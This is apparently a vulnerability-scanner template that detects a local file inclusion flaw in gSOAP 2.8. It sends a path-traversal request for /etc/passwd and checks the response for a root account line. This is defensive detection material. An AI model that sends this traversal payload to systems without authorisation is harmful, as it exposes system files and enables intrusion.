id: "gsoap-lfi"
name: "gSOAP 2.8 - Local File Inclusion"
severity: "high"
description: "gSOAP 2.8 is vulnerable to local file inclusion."
tech:
  - "generic"
tags:
  - "edb"
  - "gsoap"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/47653"
spaExclusion: true
request:
  method: "GET"
  path: "/../../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
